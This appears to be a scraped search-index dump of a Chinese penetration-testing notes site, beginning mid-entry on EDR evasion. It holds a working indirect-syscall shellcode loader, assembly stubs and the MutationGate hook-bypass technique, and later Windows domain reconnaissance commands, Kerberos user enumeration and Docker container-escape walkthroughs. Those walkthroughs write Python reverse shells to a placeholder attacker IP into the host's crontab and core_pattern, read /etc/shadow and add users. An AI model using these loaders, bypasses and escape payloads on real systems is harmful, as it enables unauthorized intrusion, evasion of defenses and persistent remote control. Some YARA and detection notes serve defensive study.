*(PLIST_ENTRY*)((PBYTE)ldr + 0x30); *ntdll = *(HMODULE*)((PBYTE)ntdlllistentry + 0x10); PLIST_ENTRY kernelbaselistentry = *(PLIST_ENTRY*)((PBYTE)ntdlllistentry); PLIST_ENTRY kernel32listentry = *(PLIST_ENTRY*)((PBYTE)kernelbaselistentry); *kernel32 = *(HMODULE*)((PBYTE)kernel32listentry + 0x10); } UINT_PTR GetSyscallAddr(IN HMODULE hModule, const CHAR* funcName) { PBYTE pBase = (PBYTE)hModule; UINT_PTR syscall; PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase; if (pImgDosHdr-\u0026gt;e_magic != IMAGE_DOS_SIGNATURE) return 0; PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-\u0026gt;e_lfanew); if (pImgNtHdrs-\u0026gt;Signature != IMAGE_NT_SIGNATURE) return 0; IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs-\u0026gt;OptionalHeader; PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir-\u0026gt;AddressOfNames); PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir-\u0026gt;AddressOfFunctions); PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir-\u0026gt;AddressOfNameOrdinals); for (DWORD i = 0; i \u0026lt; pImgExportDir-\u0026gt;NumberOfFunctions; i++) { CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]); PBYTE pFunctionAddress = (PBYTE)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]); if (_stricmp(funcName, pFunctionName) == 0) { syscall = (UINT_PTR)(pFunctionAddress + 0x12); return syscall; } } return 0; } int main() { HMODULE ntdll; HMODULE kernel32; GetModule(\u0026amp;ntdll, \u0026amp;kernel32); printf(\u0026#34;ntdll base address: %p\\n\u0026#34;, ntdll); printf(\u0026#34;kernel32 base address: %p\\n\u0026#34;, kernel32); syscall_addr1 = GetSyscallAddr(ntdll, \u0026#34;NtOpenProcess\u0026#34;); syscall_addr2 = syscall_addr1 + 0x20; syscall_addr3 = syscall_addr1 + 0x40; syscall_addr4 = syscall_addr1 + 0x60; syscall_addr5 = syscall_addr1 + 0x80; printf(\u0026#34;Address of syscall instruction is 0x%p\\n\u0026#34;, syscall_addr1); unsigned char code[] = \u0026#34;\\x48\\x31\\xd2\\x65\\x48\\x8b\\x42\\x60\\x48\\x8b\\x70\\x18\\x48\\x8b\\x76\\x20\\x4c\\x8b\\x0e\\x4d\\x8b\\x09\\x4d\\x8b\\x49\\x20\\xeb\\x63\\x41\\x8b\\x49\\x3c\\x4d\\x31\\xff\\x41\\xb7\\x88\\x4d\\x01\\xcf\\x49\\x01\\xcf\\x45\\x8b\\x3f\\x4d\\x01\\xcf\\x41\\x8b\\x4f\\x18\\x45\\x8b\\x77\\x20\\x4d\\x01\\xce\\xe3\\x3f\\xff\\xc9\\x48\\x31\\xf6\\x41\\x8b\\x34\\x8e\\x4c\\x01\\xce\\x48\\x31\\xc0\\x48\\x31\\xd2\\xfc\\xac\\x84\\xc0\\x74\\x07\\xc1\\xca\\x0d\\x01\\xc2\\xeb\\xf4\\x44\\x39\\xc2\\x75\\xda\\x45\\x8b\\x57\\x24\\x4d\\x01\\xca\\x41\\x0f\\xb7\\x0c\\x4a\\x45\\x8b\\x5f\\x1c\\x4d\\x01\\xcb\\x41\\x8b\\x04\\x8b\\x4c\\x01\\xc8\\xc3\\xc3\\x41\\xb8\\x98\\xfe\\x8a\\x0e\\xe8\\x92\\xff\\xff\\xff\\x48\\x31\\xc9\\x51\\x48\\xb9\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x51\\x48\\x8d\\x0c\\x24\\x48\\x31\\xd2\\x48\\xff\\xc2\\x48\\x83\\xec\\x28\\xff\\xd0\u0026#34;; LPVOID allocation_start; SIZE_T allocation_size = sizeof(code); HANDLE hThread; NTSTATUS status; allocation_start = nullptr; // Allocate Virtual Memory if (NtAllocateVirtualMemory(GetCurrentProcess(), \u0026amp;allocation_start, 0, (PULONG64)\u0026amp;allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) == 0) printf(\u0026#34;Memory allocated at %p\\n\u0026#34;, allocation_start); else printf(\u0026#34;Allocated failed, Error code is %d\\n\u0026#34;, GetLastError()); // Copy shellcode into allocated memory if (NtWriteVirtualMemory(GetCurrentProcess(), allocation_start, code, sizeof(code), 0) == 0) printf(\u0026#34;Copied successfully\\n\u0026#34;); else printf(\u0026#34;Copied failed, Error code is %d\\n\u0026#34;, GetLastError()); if (NtCreateThreadEx(\u0026amp;hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)allocation_start, NULL, FALSE, NULL, NULL, NULL, NULL) == 0) printf(\u0026#34;Executed successfully\\n\u0026#34;); else printf(\u0026#34;Executed failed, Error code is %d\\n\u0026#34;, GetLastError()); // Wait for the end of the thread and close the handle NtWaitForSingleObject(hThread, FALSE, NULL); NtClose(hThread); return 0; } stub.asm 代码：\nEXTERN syscall_addr1:QWORD EXTERN syscall_addr2:QWORD EXTERN syscall_addr3:QWORD EXTERN syscall_addr4:QWORD EXTERN syscall_addr5:QWORD .code NtAllocateVirtualMemory PROC mov r10, rcx mov rax, 18h jmp QWORD PTR [syscall_addr1] ret NtAllocateVirtualMemory ENDP NtWriteVirtualMemory PROC mov r10, rcx mov rax, 3Ah jmp QWORD PTR [syscall_addr2] ret NtWriteVirtualMemory ENDP NtCreateThreadEx PROC mov r10, rcx mov rax, 0C2h jmp QWORD PTR [syscall_addr3] ret NtCreateThreadEx ENDP NtWaitForSingleObject PROC mov r10, rcx mov rax, 4 jmp QWORD PTR [syscall_addr4] ret NtWaitForSingleObject ENDP NtClose PROC mov r10, rcx mov rax, 0Fh jmp QWORD PTR [syscall_addr5] ret NtClose ENDP end 我们在 C 代码里定义了全局变量 syscall_addr，因为该项目实际上还是 C++ 项目，所以需要稍微注意一下格式。出于演示程序的成功执行目的，我选择了 5 个连续的 syscall 指令的地址，如果我们想有意地选择良性 NTAPI 的 syscall 指令地址，需要仔细斟酌一下选择哪些。\n作为小练习，请写出没有混淆 syscall stub 的情况下，采用间接 syscall 调用的程序的 yara 的检测规则。\nsyswhisper3 # syswhisper3 是对 syswhisper2 的改进，也可以自动生成我们上面编写的间接 syscall 的程序所需要的相关文件。因为原理差不多，就不做额外解释了。\n导入所需文件的步骤与 syswhisper2 一致，代码也可以复用之前的。编译后，执行结果如下：\n根据 asm 文件里的函数指令，可以创建相应的 yara 规则：\nrule syswhisper3 { meta: description = \u0026#34;Hunt for syswhispe3 generated asm code\u0026#34; strings: $s1 = {48 89 4c 24 08 48 89 54 24 10 4c 89 44 24 18 4c 89 4c 24 20 48 83 ec 28 b9 ?? ?? ?? ?? e8} $s2 = {48 83 c4 28 48 8b 4c 24 08 48 8b 54 24 10 4c 8b 44 24 18 4c 8b 4c 24 20 4c 8b d1} condition: #s1 \u0026gt;=1 or #s2 \u0026gt;=1 } 因为我们导出了所有 NTAPI 的相关文件，匹配数自然很多。\n突变之门 MutationGate # 突变之门 MutationGate 是我在近期的研究成果，其实也是属于间接 syscall 的一种。但毕竟是作者我提出的，所以必须给足牌面，单独安排一个中标题。Github 地址: https://github.com/senzee1984/MutationGate 以及英文研究文章: https://winslow1984.com/books/malware/page/mutationgate\nMutationGate 通过利用硬件断点来重定向系统调用，从而绕过 EDR 的内联 hook。MutationGate 的原理是调用一个未被 hook 的良性 NTAPI，并用被 hook 的 NTAPI的 SSN 替换这个未被 hook 的 NTAPI 的 SSN。通过这种方式，syscall 被重定向到被 hook 的 NTAPI，而无需加载第 2 个 ntdll 模块或纂改已加载到内存中的 ntdll 模块，就可以绕过内联 hook。\nEDR 倾向于为一些 NTAPI 设置内联 hook，特别是那些常在恶意软件中被利用的，如 NtAllocVirtualMemory。而不常被恶意软件利用的 NTAPI 往往不会被 hook，如 NtDrawText。EDR hook 所有 NTAPI 的可能性非常小。\n假设 NTAPI NtDrawText 没有被 hook，而 NtQueryInformationProcess 被 hook 了，步骤如下：\n1. 获得 NtDrawText 的地址，通过 GetModuleHandle 与 GetProcAddress 组合，或者 PEB Walking 与导出表解析。\npNTDT = GetFuncByHash(ntdll, 0xA1920265); //NtDrawText hash pNTDTOffset_8 = (PVOID)((BYTE*)pNTDT + 0x8); //Offset 0x8 from NtDrawText 2. 为 NtQueryInformationProcess 准备相应参数。\n3. 在 NtDrawText + 0x8 处设置硬件断点，当执行流程到达这里时，SSN 已经存储在 RAX 中了，但 syscall 还未发起。\n0:000\u0026gt; u 0x00007FFBAD00EB68-8 ntdll!NtDrawText: 00007ffb`ad00eb60 4c8bd1 mov r10,rcx 00007ffb`ad00eb63 b8dd000000 mov eax,0DDh 00007ffb`ad00eb68 f604250803fe7f01 test byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1 00007ffb`ad00eb70 7503 jne ntdll!NtDrawText+0x15 (00007ffb`ad00eb75) 00007ffb`ad00eb72 0f05 syscall 00007ffb`ad00eb74 c3 ret 00007ffb`ad00eb75 cd2e int 2Eh 00007ffb`ad00eb77 c3 ret 4. 获取 NtQueryInformationProcess 的 SSN。在异常句柄里，用 NtQueryInformationProcess 的 SSN 替换 NtDrawText 的。\n...\u0026lt;SNIP\u0026gt;... uint32_t GetSSNByHash(PVOID pe, uint32_t Hash) { PBYTE pBase = (PBYTE)pe; PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase; PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-\u0026gt;e_lfanew); IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs-\u0026gt;OptionalHeader; DWORD exportdirectory_foa = RvaToFileOffset(pImgNtHdrs, ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + exportdirectory_foa); //Calculate corresponding offset PDWORD FunctionNameArray = (PDWORD)(pBase + RvaToFileOffset(pImgNtHdrs, pImgExportDir-\u0026gt;AddressOfNames)); PDWORD FunctionAddressArray = (PDWORD)(pBase + RvaToFileOffset(pImgNtHdrs, pImgExportDir-\u0026gt;AddressOfFunctions)); PWORD FunctionOrdinalArray = (PWORD)(pBase + RvaToFileOffset(pImgNtHdrs, pImgExportDir-\u0026gt;AddressOfNameOrdinals)); for (DWORD i = 0; i \u0026lt; pImgExportDir-\u0026gt;NumberOfFunctions; i++) { CHAR* pFunctionName = (CHAR*)(pBase + RvaToFileOffset(pImgNtHdrs, FunctionNameArray[i])); DWORD Function_RVA = FunctionAddressArray[FunctionOrdinalArray[i]]; if (Hash == ROR13Hash(pFunctionName)) { void *ptr = malloc(10); if (ptr == NULL) { perror(\u0026#34;malloc failed\u0026#34;); return -1; } unsigned char byteAtOffset5 = *((unsigned char*)(pBase + RvaToFileOffset(pImgNtHdrs, Function_RVA)) + 4); //printf(\u0026#34;Syscall number of function %s is: 0x%x\\n\u0026#34;, pFunctionName,byteAtOffset5); //0x18 free(ptr); return byteAtOffset5; } } return 0x0; } ...\u0026lt;SNIP\u0026gt;... 5. 我们调用 NtDrawText 函数，但准备的却是 NtQueryInformationProcess 的参数，这个调用原本会失败的。但因为我们偷梁换柱了 SSN，调用会成功。\nfnNtQueryInformationProcess pNTQIP = (fnNtQueryInformationProcess)pNTDT; NTSTATUS status = pNTQIP(pi.hProcess, ProcessBasicInformation, \u0026amp;pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL); 这个案例中，NtDrawText 的 SSN 为 0xdd，而 NtQueryInformationProcess 的 SSN 为 0x19，NtDrawText 的地址为 0x00007FFBAD00EB60\n这个调用是发起到 NtDrawText 的地址，但准备的是 NtQueryInformationProcess 的参数，因为 SSN 从 0xdd 变为了 0x19，syscall 自然是成功的。\n我们用之前的 yara 规则来扫描该 POC 程序，并没有发现符合的记录，这是当然的。\n但破绽也是有的，为了便于观察，以 SleepEx 的 NTAPI NtDelayExecution 为例，syscall 是在 ntdll 空间里发起的，看起来还算合理。然而，ntoskrnl 里的 KeDelayExecutionThread 期望的是 NtDelayExecution 发起 syscall，而不是 NtDrawText。这个破绽可以作为检测点。\n优势与检测 # MutationGate 相比其他类似的 unhook 方案具有一定的优势，尽管依旧是可能检测的。\n优势 # 不加载第 2 个 ntdll 模块 不纂改已加载的 ntdll 模块 不使用自定义的 syscall stub，因此没有对应的字节序列特征 syscall 发生在 ntdll 模块中，看起来是合理的 可能的检测方法 # 在正常程序中，调用 AddVectoredExceptionHandler 有些可疑 从内核层检视调用栈，ntoskrnl.exe 中执行的函数与 ntdll 模块中执行的函数不一致 在良性 NTAPI 中发起的 syscall 不会期望得到不属于自身的 SSN 与其他类似方法的对比 # HWSyscall(https://github.com/Dec0ne/HWSyscalls) 和 TamperingSyscall(https://github.com/rad9800/TamperingSyscalls) 都巧妙地利用硬件断点来绕过内联 hook，都是出色的方法。尽管在我获得灵感并发布 MutationGate 的期间里，我没有阅读和引用这两个项目，但的确利用了一些相似的技术和中心思想。我仔细阅读和研究了它们，并用表格总结与比较，如下所示：\n作为一个课后练习，请基于该 POC，用 MutationGate 的方法执行 calc 的 shellcode。\n"},{"id":9,"href":"/docs/%E5%85%B6%E4%BB%96/hvv%E9%9D%A2%E8%AF%95/","title":"Hvv面试","section":"Docs","content":" HVV面试 # OWASP TOP 10 # SQL 注入 失效的身份认证 敏感数据泄露 XML 外部实体（XXE） 失效的访问控制 安全配置错误 跨站脚本（XSS） 不安全的反序列化 使用含有已知漏洞的组件 不足的日志记录和监控\nLinux 提权 # 内核漏洞 SUID SUDO 计划任务 Capabilities 位提权 PEASS-ng（自动化提权脚本）\nWindows 提权 # 系统内核溢出漏洞提权 数据库提权 错误的系统配置提权 组策略首选项提权\n"},{"id":10,"href":"/docs/%E5%85%B6%E4%BB%96/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/","title":"解决ubuntu Crontab反弹shell失败的问题","section":"Docs","content":" 解决ubuntu-crontab反弹shell失败的问题 # https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/#more\n"},{"id":11,"href":"/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ad%E5%9F%9F/adsec101/","title":"Adsec101","section":"Docs","content":" ADSec101 # https://redteaming.net/pages/4e65fc/\n"},{"id":12,"href":"/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ad%E5%9F%9F/kerbrute/","title":"Kerbrute","section":"Docs","content":" Kerbrute # 通过Kerberos pre-auth进行用户枚举和口令爆破 # 渗透技巧——通过Kerberos pre-auth进行用户枚举和口令爆破\n"},{"id":13,"href":"/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ad%E5%9F%9F/keytab/","title":"Key Tab","section":"Docs","content":" KeyTab # KeyTab 是 Kerberos 的密钥表，用于存储 Kerberos 的密钥。\n存放位置 # Linux: /etc/krb5.keytab 提取信息 # https://github.com/sosdave/KeyTabExtract\n"},{"id":14,"href":"/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ad%E5%9F%9F/runas/","title":"Runas","section":"Docs","content":" runas命令 # runas命令是Windows系统中的一个命令，用于以其他用户的身份运行程序。在运行runas命令时，系统会提示输入目标用户的密码，输入正确的密码后，系统会以目标用户的身份运行指定的程序。\nrunas命令的语法如下：\nrunas /user:username program 在域中，可以使用/netonly参数指定以域用户的身份运行程序，例如：\nrunas /netonly /user:domain\\username program "},{"id":15,"href":"/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ad%E5%9F%9F/windows%E5%86%85%E9%83%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","title":"Windows内部信息收集","section":"Docs","content":" Windows内部信息收集 # query user || qwinsta 查看当前在线用户\nnet user 查看本机用户\nnet user /domain 查看域用户\nnet view \u0026amp; net group \u0026quot;domain computers\u0026quot; /domain 查看当前域计算机列表 第二个查的更多\nnet view /domain 查看有几个域\nnet view \\\\\\\\dc 查看 dc 域内共享文件\nnet group /domain 查看域里面的组\nnet group \u0026quot;domain admins\u0026quot; /domain 查看域管\nnet localgroup administrators /domain /这个也是查域管，是升级为域控时，本地账户也成为域管\nnet group \u0026quot;domain controllers\u0026quot; /domain 域控\nnet time /domain\nnet config workstation 当前登录域 - 计算机名 - 用户名\nnet use \\\\\\\\域控(如pc.xx.com) password /user:xxx.com\\username 相当于这个帐号登录域内主机，可访问资源\nipconfig\nsysteminfo\ntasklist /svc\ntasklist /S ip /U domain\\username /P /V 查看远程计算机 tasklist\nnet localgroup administrators \u0026amp;\u0026amp; whoami 查看当前是不是属于管理组\nnetstat -ano\nnltest /dclist:xx 查看域控\nwhoami /all 查看 Mandatory Label uac 级别和 sid 号\nnet sessoin 查看远程连接 session (需要管理权限)\nnet share 共享目录\ncmdkey /l 查看保存登陆凭证\necho %logonserver% 查看登陆域\nspn –l administrator spn 记录\nset 环境变量\ndsquery server 查找目录中的 AD DC/LDS 实例\ndsquery user 查找目录中的用户\ndsquery computer 查询所有计算机名称 windows 2003\ndir /s *.exe 查找指定目录下及子目录下没隐藏文件\narp -a\n"},{"id":16,"href":"/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ad%E5%9F%9F/%E5%B1%80%E5%9F%9F%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","title":"局域网信息收集","section":"Docs","content":" 局域网信息收集 # 枚举主机并识别域控制器 # https://notes.benheater.com/books/active-directory/page/enumerating-hosts-and-identifying-the-domain-controllers\n内部网络 sudo nmap -Pn -p- -T4 -A -oN nmap-scan.txt -iL targets.txt 外部网络（考虑上传nmap） # -sT : Use TCP full connect flag due to scanning through a proxy # --top-ports 1000 : Top 1,000 ports due to slow speeds with TCP full connect scanning sudo proxychains -q nmap -Pn -sT --top-ports 1000 -T4 -A -oN nmap-scan.txt -iL targets.txt 当您查看域控制器时，它的运行服务非常明显；类似于这样：\nPORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl ldap-rootdse | LDAP 根 DSE 信息 # 每个目录服务器都有一个名为 RootDSE 的唯一条目。 它提供服务器的相关数据，例如其功能、支持的 LDAP 版本以及使用的命名上下文。\n根DSE是LDAP服务器目录信息树顶部的条目。 LDAP服务器中的所有命名上下文（namingcontexts (suffixes，后缀)）直接位于根DSE下方。 根DSE包含有关LDAP服务器的信息，包括已配置的命名上下文和服务器的功能。\n内部网络 # Assumes 10.10.10.2 is the DC based on port enumeration sudo nmap -Pn -T4 -p 389,636 --script ldap-rootdse 10.10.10.2 | grep dnsHostName | sort -u 外部网络 # Via Proxy Host # Assumes 10.10.10.2 is the DC based on port enumeration sudo proxychains -q nmap -Pn -T4 -sT -p 389,636 --script ldap-rootdse 10.10.10.2 | grep dnsHostName | sort -u RID Cycling to Enumerate Users | RID 循环枚举用户 # 前提：允许空会话\n根据此文章反向操作开启空会话： How to Disable Null Session in Windows\nenum4linux -a -r -K 5000 10.80.80.2 Anonymous LDAP Queries | 匿名 LDAP 查询 # ldapsearch -x -H ldap://10.80.80.2 -D \u0026#39;CN=anonymous,DC=ad,DC=lab\u0026#39; -W -b \u0026#39;DC=ad,DC=lab\u0026#39; \u0026#39;objectClass=user\u0026#39; | grep -i \u0026#39;sAMAccountName\u0026#39; 以“anonymous@ad.lab”身份进行身份验证，当提示输入密码时，按 Enter\nkerbrute | Kerberos 爆破 # 枚举用户名 # kerbrute userenum --dc ad.lab -d ad.lab /usr/share/wordlists/rockyou.txt "},{"id":17,"href":"/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ad%E5%9F%9F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/ipc/","title":"IP C","section":"Docs","content":" IPC # IPC$的概念 # IPC$(Internet Process Connection)是共享“命名管道”的资源，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限,在远程管理计算机和查看计算机的共享资源时使用。\nIPC$的作用 # 利用IPC$，连接者可以与目标主机建立一个连接，利用这个连接，连接者可以得到目标主机上的目录结构、用户列表等信息。\n"},{"id":18,"href":"/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ad%E5%9F%9F/%E7%9B%B8%E5%85%B3%E8%B5%84%E6%96%99/","title":"相关资料","section":"Docs","content":" Active Directory 相关资料 # Active Directory Book\nActive Directory Attack Path \u0026amp; VMs\nHackTricks - Active Directory Methodology\n"},{"id":19,"href":"/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/","title":"代理转发","section":"Docs","content":" 代理转发 # https://www.freebuf.com/articles/web/256415.html\nstowaway # 用法\nhttps://blog.csdn.net/qq_44159028/article/details/129681017\nNeo-reGeorg # https://github.com/L-codes/Neo-reGeorg\n"},{"id":20,"href":"/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/","title":"容器逃逸","section":"Docs","content":" 容器逃逸 # 识别docker容器 # 1. 检查根目录下是否存在.dockerenv文件 # ls -al / | grep .dockerenv 2. 检查 /proc/1/cgroup 是否存在含有docker字符串 # cat /proc/1/cgroup | grep docker 逃逸方式 # Container Escape: All You Need is Cap (Capabilities) # https://www.cybereason.com/blog/container-escape-all-you-need-is-cap-capabilities\nHackTricks - Docker Breakout / Privilege Escalation # https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation\n〇. 使用工具：CDK # https://github.com/cdk-team/CDK\n一. Docker Remote API未授权访问逃逸 # https://blog.csdn.net/qq_64973687/article/details/132187299\n基础知识 # Docker Remote API 是一个取代远程命令行界面（rcli）的REST API，其默认绑定2375端口，如管理员对其配置不当可导致未授权访问漏洞。\ndockerd -H=0.0.0.0:2375 -H unix:///var/run/docker.sock 攻击者利用 docker client 或者 http 直接请求就可以访问这个 API，可导致敏感信息泄露，甚至可进一步利用Docker自身特性，借助容器逃逸，最终完全控制宿主服务器\nDocker daemon 是 Docker 引擎的后台进程，也称为 Dockerd。它是一个长时间运行的进程，负责管理 Docker 镜像、容器、网络和存储等各种资源，并提供一个 API 以供 Docker 客户端进行交互\n当您在 Docker 主机上使用 Docker 命令时（例如 docker run），Docker 客户端将向 Docker daemon 发送命令请求，并通过 Docker API 进行通信。Docker daemon 接收并解析这些请求，并在其内部管理对象存储中创建、修改或删除相应的 Docker 资源。随后，Docker daemon 将响应结果发送回客户端，然后等待下一个命令请求\n另外，Docker daemon 也负责监视 Docker 主机上正在运行的容器和服务，以及处理与 Docker 网络和存储相关的操作。它还可以与其他 Docker daemon 进行通信，以实现跨主机的镜像和容器管理。总之，Docker daemon 是整个 Docker 引擎的核心组件，负责实现 Docker 的各种功能，并将其暴露给用户和其他程序使用\n漏洞验证 # 访问 http 请求 curl $宿主机IP:2375/info，如果返回内容含有DockerRootDir等字符，则证明存在docker未授权访问漏洞\ncurl $宿主机IP:2375/info | grep DockerRootDir 漏洞利用 # docker -H tcp://$宿主机IP:2375 ps -a 新运行一个容器，挂载点设置为服务器的根目录挂载至/mnt目录下，此时修改/mnt/etc/crontab相当于修改/etc/crontab文件\ndocker -H tcp://$宿主机IP:2375 run -it -v /:/mnt nginx:latest /bin/bash 在容器内执行命令，将反弹shell的脚本写入到/etc/crontab文件\necho -e \u0026#34;* * * * * root /usr/bin/python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\u0026#34;$攻击机IP\\\u0026#34;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\u0026#34;/bin/sh\\\u0026#34;,\\\u0026#34;-i\\\u0026#34;]);\u0026#39;\\n\u0026#34; \u0026gt;\u0026gt; /mnt/etc/crontab 二. privileged特权模式启动容器逃逸 # https://wiki.teamssix.com/cloudnative/docker/docker-privileged-escape.html\nhttps://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation#privileged\n漏洞环境 # docker run -itd --privileged ubuntu /bin/bash 漏洞判断 # 判断是否是特权模式启动，如果是以特权模式启动的话，CapEff对应的掩码值应该为0000003fffffffff。\ncat /proc/self/status |grep CapEff 漏洞利用 # 方法一：磁盘挂载 # 在docker容器中查看系统磁盘分区情况，在新建一个目录，将宿主机所在磁盘挂载到新建的目录中。\nfdisk -l mkdir /mnt mount /dev/sda1 /mnt 尝试访问宿主机 shadow 文件\ncat /mnt/etc/shadow 写入定时任务反弹shell（不同系统可能路径不同）\necho -e \u0026#34;* * * * * root /usr/bin/python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\u0026#34;$攻击机IP\\\u0026#34;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\u0026#34;/bin/sh\\\u0026#34;,\\\u0026#34;-i\\\u0026#34;]);\u0026#39;\\n\u0026#34; \u0026gt;\u0026gt; /mnt/etc/crontab 方法二：通过新添加的用户登录 # mount /dev/sda1 /mnt chroot /mnt adduser john 其他方法 # https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation#privileged--hostpid\n三. 危险挂载导致Docker逃逸 # 挂在了根目录到容器内，容器内可以直接修改宿主机文件\n漏洞利用同上\n四. 挂载Docker Socket逃逸 # 在启动docker容器时，将宿主机/var/run/docker.sock文件挂载到docker容器中，在docker容器中，也可以操作宿主机的docker。\n漏洞验证 # find / -name docker.sock 漏洞利用 # 在docker容器中安装docker\napt-get update apt-get install docker.io 使用命令查看宿主机拉取的镜像。\ndocker -H unix://var/run/docker.sock images 在docker容器中，使用命令再运行一个docker容器,将宿主机的根目录挂载到ubuntu的test目录中，造成docker逃逸，在通过写计划任务方式，反弹shell，具体同上\ndocker -H unix://var/run/docker.sock run -v /:/test -it ubuntu /bin/bash ls /test 五. 挂载宿主机procfs逃逸 # https://www.freebuf.com/articles/system/383583.html\n挂载宿主机的 procfs 文件系统通常是为了让容器可以访问主机的进程信息。然而，在某些情况下，滥用挂载 procfs 可能导致容器逃逸，即容器能够访问宿主机上其他进程的敏感信息。在 Docker 中，默认情况下，容器内的 procfs 文件系统被挂载为只读。因此，容器内的进程只能查看自己的进程信息，无法访问宿主机的 procfs。这有助于提高容器的隔离性和安全性。然而，如果在创建容器时显式地将宿主机的 procfs 挂载为可读写，或者容器内的进程具有容器特权（例如，使用特权模式运行容器），那么容器就有可能滥用 procfs 功能，以获取宿主机上其他进程的敏感信息。\nprocfs中的/proc/sys/kernel/core_pattern负责配置进程崩溃时内存转储数据的导出方式，如果/proc/sys/kernel/core_pattern文件中的首个字符是管道符| ，那么该行的剩余内容将被当作用户空间程序或脚本解释并执行。当利用这种方式进行docker逃逸时，触发条件比较苛刻，需要有进程奔溃才能触发\n漏洞环境 # docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu 漏洞验证 # 如果找到两个core_pattern文件，那可能就是挂载了宿主机的procfs。\nfind / -name core_pattern 漏洞利用 # 方法一：手动 # 当启动一个容器时，会在/var/lib/docker/overlay2目录下生成一层容器层，容器层里面包括diff、link、lower、merged、work目录，而docker容器的目录保存在merged目录中，通过命令找到当前容器在宿主机下的绝对路径，workdir代表的是docker容器在宿主机中的绝对路径。\ncat /proc/mounts | xargs -d \u0026#39;,\u0026#39; -n 1 | grep workdir 假设当前绝对路径为\n/var/lib/docker/overlay2/5a622d02ad5431399339448ce6ae7a2b7bd6107e9dd5408c76770c1b89ea1a02/merged\n向容器内/host/proc/sys/kernel/core_pattern写入以下内容\necho -e \u0026#34;|/var/lib/docker/overlay2/5a622d02ad5431399339448ce6ae7a2b7bd6107e9dd5408c76770c1b89ea1a02/merged/tmp/.x.py \\rcore \u0026#34; \u0026gt; /host/proc/sys/kernel/core_pattern 然后在容器内创建一个反弹shell /tmp/.x.py\ncat \u0026gt;/tmp/.x.py \u0026lt;\u0026lt; EOF # !/usr/bin/python import os import pty import socket lhost = \u0026#34;attacker-ip\u0026#34; lport = 10000 def main(): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((lhost, lport)) os.dup2(s.fileno(), 0) os.dup2(s.fileno(), 1) os.dup2(s.fileno(), 2) os.putenv(\u0026#34;HISTFILE\u0026#34;, \u0026#39;/dev/null\u0026#39;) pty.spawn(\u0026#34;/bin/bash\u0026#34;) os.remove(\u0026#39;/tmp/.x.py\u0026#39;) s.close() if __name__ == \u0026#34;__main__\u0026#34;: main() EOF chmod +x /tmp/.x.py 